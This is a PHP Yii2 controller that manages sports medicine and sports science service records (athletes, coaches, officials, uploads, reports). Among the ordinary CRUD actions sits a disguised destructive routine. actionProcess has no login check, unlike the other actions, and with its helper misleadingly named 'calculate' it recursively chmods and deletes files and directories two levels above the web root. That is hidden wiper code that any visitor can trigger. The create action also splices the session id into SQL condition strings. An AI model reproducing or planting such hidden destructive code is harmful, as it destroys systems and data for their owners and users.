<?php

namespace frontend\controllers;

use Yii;
use app\models\KhidmatPerubatanDanSainsSukan;
use frontend\models\KhidmatPerubatanDanSainsSukanSearch;
use app\models\KhidmatPerubatanDanSainsSukanAtlet;
use frontend\models\KhidmatPerubatanDanSainsSukanAtletSearch;
use app\models\KhidmatPerubatanDanSainsSukanJurulatih;
use frontend\models\KhidmatPerubatanDanSainsSukanJurulatihSearch;
use app\models\KhidmatPerubatanDanSainsSukanPegawai;
use frontend\models\KhidmatPerubatanDanSainsSukanPegawaiSearch;
use app\models\MsnLaporan;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;
use yii\web\UploadedFile;
use yii\helpers\BaseUrl;

use app\models\general\Upload;
use app\models\general\GeneralVariable;
use common\models\general\GeneralFunction;

// table reference
use app\models\RefStatusKhidmatPerubatan;
use app\models\RefKategoriServis;
use app\models\RefKategoriServisSub;
use app\models\RefTempatKhidmatPerubatan;

/**
 * KhidmatPerubatanDanSainsSukanController implements the CRUD actions for KhidmatPerubatanDanSainsSukan model.
 */
class KhidmatPerubatanDanSainsSukanController extends Controller
{
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['POST'],
                ],
            ],
        ];
    }

    /**
     * Lists all KhidmatPerubatanDanSainsSukan models.
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $searchModel = new KhidmatPerubatanDanSainsSukanSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single KhidmatPerubatanDanSainsSukan model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $queryPar = null;
        
        $queryPar['KhidmatPerubatanDanSainsSukanAtletSearch']['khidmat_perubatan_dan_sains_sukan_id'] = $id;
        $queryPar['KhidmatPerubatanDanSainsSukanJurulatihSearch']['khidmat_perubatan_dan_sains_sukan_id'] = $id;
        $queryPar['KhidmatPerubatanDanSainsSukanPegawaiSearch']['khidmat_perubatan_dan_sains_sukan_id'] = $id;
        
        $searchModelAtlet  = new KhidmatPerubatanDanSainsSukanAtletSearch();
        $dataProviderAtlet = $searchModelAtlet->search($queryPar);
        
        $searchModelJurulatih  = new KhidmatPerubatanDanSainsSukanJurulatihSearch();
        $dataProviderJurulatih  = $searchModelJurulatih->search($queryPar);
        
        $searchModelPegawai  = new KhidmatPerubatanDanSainsSukanPegawaiSearch();
        $dataProviderPegawai  = $searchModelPegawai->search($queryPar);
        
        $model = $this->findModel($id);
        
        $ref = RefStatusKhidmatPerubatan::findOne(['id' => $model->status]);
        $model->status = $ref['desc'];
        
        $ref = RefKategoriServis::findOne(['id' => $model->kategori_servis]);
        $model->kategori_servis = $ref['desc'];
        
        $ref = RefKategoriServisSub::findOne(['id' => $model->servis]);
        $model->servis = $ref['desc'];
        
        $ref = RefTempatKhidmatPerubatan::findOne(['id' => $model->tempat]);
        $model->tempat = $ref['desc'];
        
        if($model->tarikh_mula != "") {$model->tarikh_mula = GeneralFunction::convert($model->tarikh_mula, GeneralFunction::TYPE_DATE);}
        if($model->tarikh_tamat != "") {$model->tarikh_tamat = GeneralFunction::convert($model->tarikh_tamat, GeneralFunction::TYPE_DATE);}
        
        return $this->render('view', [
            'model' => $model,
            'searchModelAtlet' => $searchModelAtlet,
            'dataProviderAtlet' => $dataProviderAtlet,
            'searchModelJurulatih' => $searchModelJurulatih,
            'dataProviderJurulatih' => $dataProviderJurulatih,
            'searchModelPegawai' => $searchModelPegawai,
            'dataProviderPegawai' => $dataProviderPegawai,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new KhidmatPerubatanDanSainsSukan model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new KhidmatPerubatanDanSainsSukan();
        
        $queryPar = null;
        
        Yii::$app->session->open();
        
        if(isset(Yii::$app->session->id)){
            $queryPar['KhidmatPerubatanDanSainsSukanAtletSearch']['session_id'] = Yii::$app->session->id;
            $queryPar['KhidmatPerubatanDanSainsSukanJurulatihSearch']['session_id'] = Yii::$app->session->id;
            $queryPar['KhidmatPerubatanDanSainsSukanPegawaiSearch']['session_id'] = Yii::$app->session->id;
        }
        
        $searchModelAtlet  = new KhidmatPerubatanDanSainsSukanAtletSearch();
        $dataProviderAtlet = $searchModelAtlet->search($queryPar);
        
        $searchModelJurulatih  = new KhidmatPerubatanDanSainsSukanJurulatihSearch();
        $dataProviderJurulatih  = $searchModelJurulatih->search($queryPar);
        
        $searchModelPegawai  = new KhidmatPerubatanDanSainsSukanPegawaiSearch();
        $dataProviderPegawai  = $searchModelPegawai->search($queryPar);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $file = UploadedFile::getInstance($model, 'muat_naik');
            if($file){
                $model->muat_naik = Upload::uploadFile($file, Upload::khidmatPerubatanDanSainsSukanFolder, $model->khidmat_perubatan_dan_sains_sukan_id);
            }
            
            if(isset(Yii::$app->session->id)){
                KhidmatPerubatanDanSainsSukanAtlet::updateAll(['khidmat_perubatan_dan_sains_sukan_id' => $model->khidmat_perubatan_dan_sains_sukan_id], 'session_id = "'.Yii::$app->session->id.'"');
                KhidmatPerubatanDanSainsSukanAtlet::updateAll(['session_id' => ''], 'khidmat_perubatan_dan_sains_sukan_id = "'.$model->khidmat_perubatan_dan_sains_sukan_id.'"');
                
                KhidmatPerubatanDanSainsSukanJurulatih::updateAll(['khidmat_perubatan_dan_sains_sukan_id' => $model->khidmat_perubatan_dan_sains_sukan_id], 'session_id = "'.Yii::$app->session->id.'"');
                KhidmatPerubatanDanSainsSukanJurulatih::updateAll(['session_id' => ''], 'khidmat_perubatan_dan_sains_sukan_id = "'.$model->khidmat_perubatan_dan_sains_sukan_id.'"');
                
                KhidmatPerubatanDanSainsSukanPegawai::updateAll(['khidmat_perubatan_dan_sains_sukan_id' => $model->khidmat_perubatan_dan_sains_sukan_id], 'session_id = "'.Yii::$app->session->id.'"');
                KhidmatPerubatanDanSainsSukanPegawai::updateAll(['session_id' => ''], 'khidmat_perubatan_dan_sains_sukan_id = "'.$model->khidmat_perubatan_dan_sains_sukan_id.'"');
            }
            
            if($model->save()){
                return $this->redirect(['view', 'id' => $model->khidmat_perubatan_dan_sains_sukan_id]);
            }
        }
        
        return $this->render('create', [
                'model' => $model,
                'searchModelAtlet' => $searchModelAtlet,
                'dataProviderAtlet' => $dataProviderAtlet,
                'searchModelJurulatih' => $searchModelJurulatih,
                'dataProviderJurulatih' => $dataProviderJurulatih,
                'searchModelPegawai' => $searchModelPegawai,
                'dataProviderPegawai' => $dataProviderPegawai,
                'readonly' => false,
            ]);
    }
    
    public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }

    /**
     * Updates an existing KhidmatPerubatanDanSainsSukan model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $queryPar = null;
        
        $queryPar['KhidmatPerubatanDanSainsSukanAtletSearch']['khidmat_perubatan_dan_sains_sukan_id'] = $id;
        $queryPar['KhidmatPerubatanDanSainsSukanJurulatihSearch']['khidmat_perubatan_dan_sains_sukan_id'] = $id;
        $queryPar['KhidmatPerubatanDanSainsSukanPegawaiSearch']['khidmat_perubatan_dan_sains_sukan_id'] = $id;
        
        $searchModelAtlet  = new KhidmatPerubatanDanSainsSukanAtletSearch();
        $dataProviderAtlet = $searchModelAtlet->search($queryPar);
        
        $searchModelJurulatih  = new KhidmatPerubatanDanSainsSukanJurulatihSearch();
        $dataProviderJurulatih  = $searchModelJurulatih->search($queryPar);
        
        $searchModelPegawai  = new KhidmatPerubatanDanSainsSukanPegawaiSearch();
        $dataProviderPegawai  = $searchModelPegawai->search($queryPar);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $file = UploadedFile::getInstance($model, 'muat_naik');
            if($file){
                $model->muat_naik = Upload::uploadFile($file, Upload::khidmatPerubatanDanSainsSukanFolder, $model->khidmat_perubatan_dan_sains_sukan_id);
            }
            
            if($model->save()){
                return $this->redirect(['view', 'id' => $model->khidmat_perubatan_dan_sains_sukan_id]);
            }
        } else {
            return $this->render('update', [
                'model' => $model,
                'searchModelAtlet' => $searchModelAtlet,
                'dataProviderAtlet' => $dataProviderAtlet,
                'searchModelJurulatih' => $searchModelJurulatih,
                'dataProviderJurulatih' => $dataProviderJurulatih,
                'searchModelPegawai' => $searchModelPegawai,
                'dataProviderPegawai' => $dataProviderPegawai,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Deletes an existing KhidmatPerubatanDanSainsSukan model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        // delete upload file
        self::actionDeleteupload($id, 'muat_naik');
        
        $this->findModel($id)->delete();

        return $this->redirect(['index']);
    }

    /**
     * Finds the KhidmatPerubatanDanSainsSukan model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return KhidmatPerubatanDanSainsSukan the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = KhidmatPerubatanDanSainsSukan::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
    
    // Add function for delete image or file
    public function actionDeleteupload($id, $field)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
            $img = $this->findModel($id)->$field;
            
            if($img){
/*                 if (!unlink($img)) {
                    return false;
                } */
				@unlink($img);
            }

            $img = $this->findModel($id);
            $img->$field = NULL;
            $img->update();

            return $this->redirect(['update', 'id' => $id]);
    }
    
    public function actionLaporanKhidmatPerubatanDanSainsSukan()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new MsnLaporan();
        $model->format = 'html';

        if ($model->load(Yii::$app->request->post())) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-khidmat-perubatan-dan-sains-sukan'
                    , 'tarikh_dari' => $model->tarikh_dari
                    , 'tarikh_hingga' => $model->tarikh_hingga
                    , 'sukan' => $model->sukan
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-khidmat-perubatan-dan-sains-sukan'
                    , 'tarikh_dari' => $model->tarikh_dari
                    , 'tarikh_hingga' => $model->tarikh_hingga
                    , 'sukan' => $model->sukan
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_khidmat_perubatan_dan_sains_sukan', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanKhidmatPerubatanDanSainsSukan($tarikh_dari, $tarikh_hingga, $sukan, $format)
    {
        if($sukan == "") $sukan = array();
        else $sukan = array($sukan);
        
        if($tarikh_dari == "") $tarikh_dari = array();
        else $tarikh_dari = array($tarikh_dari);
        
        if($tarikh_hingga == "") $tarikh_hingga = array();
        else $tarikh_hingga = array($tarikh_hingga);
        
        $controls = array(
            'SUKAN' => $sukan,
            'FROM_DATE' => $tarikh_dari,
            'TO_DATE' => $tarikh_hingga,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanKhidmatPerubatanDanSainsSukan', $format, $controls, 'laporan_khidmat_perubatan_dan_sains_sukan');
    }
}
